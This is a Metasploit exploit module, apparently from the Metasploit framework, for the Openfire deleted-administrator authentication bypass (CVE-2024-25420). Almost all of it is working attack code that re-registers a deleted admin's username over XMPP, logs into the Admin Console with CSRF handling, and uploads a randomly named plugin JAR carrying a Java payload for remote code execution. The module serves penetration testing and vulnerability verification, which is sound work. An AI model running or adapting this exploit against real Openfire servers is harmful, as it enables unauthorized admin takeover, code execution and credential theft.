##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Xmpp
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Openfire Deleted Administrator Account Authentication Bypass RCE',
        'Description' => %q{
          Openfire versions before 4.8.1 did not remove a user's JID from the
          admin.authorizedJIDs property when the user was deleted. If an attacker knows the
          username of a deleted administrator and in-band registration is enabled, the attacker
          can recreate that account and inherit administrative access. An authenticated Openfire
          administrator can upload a management plugin containing a Java payload.

          Openfire 4.8.1 prevents new stale entries when a user is deleted, but it does not migrate
          entries created by an older version. An upgraded server can therefore remain exploitable
          until the recreated account is deleted while the fix is present.

          The ADMINUSERNAME option must identify a previously deleted administrator. The check
          method does not create accounts and cannot determine whether this target-specific state
          exists.
        },
        'Author' => [
          'xRogue', # Vulnerability research and public analysis
          'Admin9961', # Metasploit module request
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Existing Openfire plugin upload implementation
          'Jatin Mannepalli' # Metasploit module
        ],
        'References' => [
          ['CVE', '2024-25420'],
          ['GHSA', '5xvc-rwv8-86p7', 'igniterealtime/Openfire'],
          ['URL', 'https://www.hackthebox.com/blog/openfire-cves-explained-CVE-2024-25420-CVE-2024-25421'],
          ['URL', 'https://github.com/rapid7/metasploit-framework/issues/19949']
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'java',
        'Arch' => ARCH_JAVA,
        'Privileged' => false,
        'Targets' => [
          ['Java Universal', {}]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2024-03-26',
        'DefaultOptions' => {
          'RPORT' => 9090,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS, CONFIG_CHANGES],
          'Reliability' => [EVENT_DEPENDENT]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The Openfire Admin Console base path', '/']),
        OptPort.new('XMPPPORT', [true, 'The Openfire XMPP client port', 5222]),
        OptString.new('XMPPDOMAIN', [true, 'The Openfire XMPP domain']),
        OptString.new('ADMINUSERNAME', [true, 'The exact username of a previously deleted Openfire administrator'])
      ]
    )

    register_advanced_options(
      [
        OptInt.new('XMPPTimeout', [true, 'Maximum number of seconds to wait for each XMPP response', 10])
      ]
    )
  end

  def openfire_version
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login.jsp')
    )
    return unless res&.code == 200

    match = res.body.match(/Openfire,\s*Version:\s*(\d+(?:\.\d+){1,3})/i)
    Rex::Version.new(match[1]) if match
  end

  def register_stale_administrator(username, password)
    nsock = xmpp_connection
    features = xmpp_stream_features(nsock)

    if xmpp_starttls_advertised?(features)
      vprint_status('Negotiating XMPP STARTTLS')
      xmpp_upgrade_to_tls(nsock)
      features = xmpp_stream_features(nsock)
    end

    raise XmppError, 'The server does not advertise XEP-0077 in-band registration' unless xmpp_registration_advertised?(features)

    nsock.put("<iq type='get' id='reg-get'><query xmlns='#{XMPP_IQ_REGISTER}'/></iq>")
    form_response = xmpp_iq_response(nsock, 'reg-get')
    unless xmpp_iq_type(form_response, 'reg-get') == 'result'
      reason = xmpp_error_condition(form_response) || 'unexpected response'
      raise XmppError, "The XMPP registration form request failed: #{reason}"
    end

    escaped_username = CGI.escapeHTML(username)
    escaped_password = CGI.escapeHTML(password)
    print_warning(
      "The registration attempt may create XMPP account #{username.inspect} with password #{password.inspect}; " \
      'the account is unconfirmed until Openfire returns success, so preserve this credential for cleanup if the response is lost'
    )
    nsock.put(
      "<iq type='set' id='reg-set'><query xmlns='#{XMPP_IQ_REGISTER}'>" \
      "<username>#{escaped_username}</username><password>#{escaped_password}</password>" \
      '</query></iq>'
    )
    registration_response = xmpp_iq_response(nsock, 'reg-set')
    return if xmpp_iq_type(registration_response, 'reg-set') == 'result'

    reason = xmpp_error_condition(registration_response) || 'unexpected response'
    raise XmppError, "The XMPP account registration failed: #{reason}"
  ensure
    begin
      begin
        nsock&.put('</stream:stream>')
      rescue Rex::ConnectionError, IOError, SystemCallError, OpenSSL::SSL::SSLError
        nil
      end
    ensure
      xmpp_disconnect(nsock) if nsock
    end
  end

  def csrf_cookie
    cookie_jar.cookies.find { |cookie| cookie.name == 'csrf' }&.value
  end

  def report_xmpp_account(username, password)
    print_good("Registered XMPP account #{username.inspect} with password #{password.inspect}")
    store_valid_credential(
      user: username,
      private: password,
      service_data: {
        origin_type: :service,
        address: rhost,
        port: datastore['XMPPPORT'],
        service_name: 'xmpp',
        protocol: 'tcp',
        workspace_id: myworkspace_id
      }
    )
  rescue StandardError => e
    vprint_warning("Could not save the XMPP credential to the database: #{e.message}")
  end

  def report_admin_credential(username, password)
    store_valid_credential(user: username, private: password, proof: cookie_jar.cookies)
  rescue StandardError => e
    vprint_warning("Could not save the Admin Console credential to the database: #{e.message}")
  end

  def login_administrator(username, password)
    cookie_jar.clear
    login_page = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login.jsp'),
      'keep_cookies' => true
    )
    return false unless login_page&.code == 200 && csrf_cookie

    login_response = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'login.jsp'),
      'keep_cookies' => true,
      'vars_post' => {
        'url' => '%2Findex.jsp',
        'login' => 'true',
        'csrf' => csrf_cookie,
        'username' => username,
        'password' => password
      }
    )
    return false unless login_response&.code == 302 && login_response.headers['Location']&.include?('index.jsp')

    index_response = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.jsp'),
      'keep_cookies' => true
    )
    return false unless index_response&.code == 200

    document = index_response.get_html_document
    document.at_css('meta[name="pageID"][content="server-settings"]') && !document.at_css('input[name="login"]')
  end

  def prepare_plugin_jar
    files = [
      ['logo_large.gif'],
      ['logo_small.gif'],
      ['readme.html'],
      ['changelog.html'],
      ['lib', 'plugin-metasploit.jar']
    ]

    jar = Rex::Zip::Jar.new
    jar.add_files(files, File.join(Msf::Config.data_directory, 'exploits', 'openfire_plugin'))

    @plugin_name = Rex::Text.rand_text_alphanumeric(8..15)
    plugin_xml = File.binread(File.join(Msf::Config.data_directory, 'exploits', 'openfire_plugin', 'plugin.xml'))
    plugin_xml.gsub!(/PLUGINNAME/, @plugin_name)
    plugin_xml.gsub!(/PLUGINDESCRIPTION/, Rex::Text.rand_text_alphanumeric(8..15))
    plugin_xml.gsub!(/PLUGINAUTHOR/, Rex::Text.rand_text_alphanumeric(8..15))
    jar.add_file('plugin.xml', plugin_xml)
    jar
  end

  def upload_and_execute_plugin(plugin_jar)
    plugin_page = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'plugin-admin.jsp'),
      'keep_cookies' => true
    )
    return false unless plugin_page&.code == 200 && csrf_cookie

    form_data = Rex::MIME::Message.new
    form_data.add_part(plugin_jar.to_s, 'application/x-java-archive', 'binary', "form-data; name=\"uploadfile\"; filename=\"#{@plugin_name}.jar\"")

    print_warning("The upload attempt may leave plugin #{@plugin_name.inspect}; inspect and remove it manually if the response is lost or the exploit fails")
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'plugin-admin.jsp'),
      'ctype' => "multipart/form-data; boundary=#{form_data.bound}",
      'keep_cookies' => true,
      'data' => form_data.to_s,
      'vars_get' => {
        'uploadplugin' => nil,
        'csrf' => csrf_cookie
      }
    )

    # Openfire can close the HTTP connection while the newly loaded plugin starts the payload.
    # Preserve the behavior of the existing Openfire plugin-upload module for that success path.
    return true unless res

    res.code == 302 && res.headers['Location']&.include?('uploadsuccess=true')
  end

  def check
    begin
      xmpp_timeout
    rescue XmppError => e
      return CheckCode::Unsupported("Invalid XMPPTimeout option: #{e.message}")
    end

    begin
      version = openfire_version
    rescue Rex::ConnectionError, Rex::ConnectionTimeout, Rex::ConnectionRefused, Rex::HostUnreachable, OpenSSL::SSL::SSLError, IOError, SystemCallError => e
      return CheckCode::Unknown("The Openfire Admin Console could not be reached: #{e.message}")
    end
    return CheckCode::Unknown('The Openfire Admin Console version could not be determined') unless version

    begin
      features = xmpp_feature_probe
    rescue Rex::ConnectionError, Rex::ConnectionTimeout, Rex::ConnectionRefused, Rex::HostUnreachable, XmppError, OpenSSL::SSL::SSLError, IOError, SystemCallError => e
      return CheckCode::Unknown("Openfire #{version} was detected, but the XMPP registration endpoint could not be verified: #{e.message}")
    end

    unless xmpp_registration_advertised?(features)
      return CheckCode::Safe("Openfire #{version} is not exploitable through this module because it does not advertise XEP-0077 registration on the configured XMPP port")
    end

    if version < Rex::Version.new('4.8.1')
      return CheckCode::Appears("Openfire #{version} advertises XEP-0077 registration; exploitation still requires a stale deleted-administrator username")
    end

    CheckCode::Detected("Openfire #{version} advertises XEP-0077 registration; patched deletions are protected, but stale state retained across an upgrade cannot be determined remotely")
  end

  def exploit
    username = datastore['ADMINUSERNAME']
    password = Rex::Text.rand_password(20)

    begin
      xmpp_timeout
    rescue XmppError => e
      fail_with(Failure::BadConfig, e.message)
    end

    print_status("Re-registering the supplied deleted administrator username #{username.inspect} through XMPP")
    begin
      register_stale_administrator(username, password)
    rescue Rex::ConnectionError, Rex::ConnectionTimeout, Rex::ConnectionRefused, Rex::HostUnreachable => e
      fail_with(Failure::Unreachable, "The XMPP registration endpoint could not be reached: #{e.message}")
    rescue XmppError, OpenSSL::SSL::SSLError, IOError, SystemCallError => e
      fail_with(Failure::UnexpectedReply, e.message)
    end

    report_xmpp_account(username, password)
    print_warning("Account #{username.inspect} now exists and must be removed manually if any later step fails")

    print_status('Attempting to authenticate the recreated account to the Openfire Admin Console')
    begin
      authenticated = login_administrator(username, password)
    rescue Rex::ConnectionError, Rex::ConnectionTimeout, Rex::ConnectionRefused, Rex::HostUnreachable, OpenSSL::SSL::SSLError, IOError, SystemCallError => e
      fail_with(Failure::Unreachable, "The account was created, but the Openfire Admin Console could not be reached: #{e.message}. Remove the account manually")
    end
    unless authenticated
      fail_with(Failure::NoAccess, 'The account was created but did not inherit Openfire administrator access; it must be removed manually')
    end

    report_admin_credential(username, password)
    print_good("Authenticated #{username.inspect} as an Openfire administrator")

    plugin = prepare_plugin_jar
    plugin.add_file("lib/#{Rex::Text.rand_text_alphanumeric(8)}.jar", payload.encoded_jar.pack)
    plugin.build_manifest

    print_status("Uploading Openfire plugin #{@plugin_name.inspect}")
    begin
      uploaded = upload_and_execute_plugin(plugin.pack)
    rescue Rex::ConnectionError, Rex::ConnectionTimeout, Rex::ConnectionRefused, Rex::HostUnreachable, OpenSSL::SSL::SSLError, IOError, SystemCallError => e
      fail_with(Failure::Unreachable, "The Openfire plugin upload connection failed: #{e.message}. Inspect the server for the plugin and remove the recreated account manually")
    end
    fail_with(Failure::PayloadFailed, 'The Openfire plugin upload or payload execution did not succeed') unless uploaded

    print_warning("Plugin #{@plugin_name.inspect} must be removed manually from the Openfire Admin Console")
    print_warning("Account #{username.inspect} must be removed manually; deleting it on Openfire 4.8.1 or later also removes the stale administrator authorization")
  end
end
